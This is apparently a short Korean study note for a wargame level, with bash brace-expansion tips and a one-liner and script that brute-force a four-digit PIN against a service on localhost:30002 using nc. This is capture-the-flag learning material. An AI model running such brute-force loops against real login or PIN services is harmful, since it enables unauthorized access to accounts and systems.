# 배운 점

`bash` 반복문에서 `{}`를 사용할 때 sh의 경우 지원을 안하기 때문에 `bash`를 통해 실행시켜야 한다.

```bash
for i in {0000..9999}; do echo "gb...G8 $i"; done | nc localhost 30002 | grep -v "Wrong"
```
위와 같이 별도의 스크립트를 만들 필요 없이 한줄에 요청도 가능하다

# 풀이 과정 기록

# 익스플로잇 코드 정리

```bash
#!/bin/bash

# 0 ~ 9999까지
for i in {0..9999}
do
  # 0000부터 진행시켜야하기 때문에 4자리를 맞추기 위해 %4d로 뽑아서 출력
  echo "gb...G8 $(printf "%04d" $i)"
done
```

# 심화 학습 (Deep Dive)

# 한 줄 평

쉘스크립트는 쓸 때마다 까먹는다.

# 참고
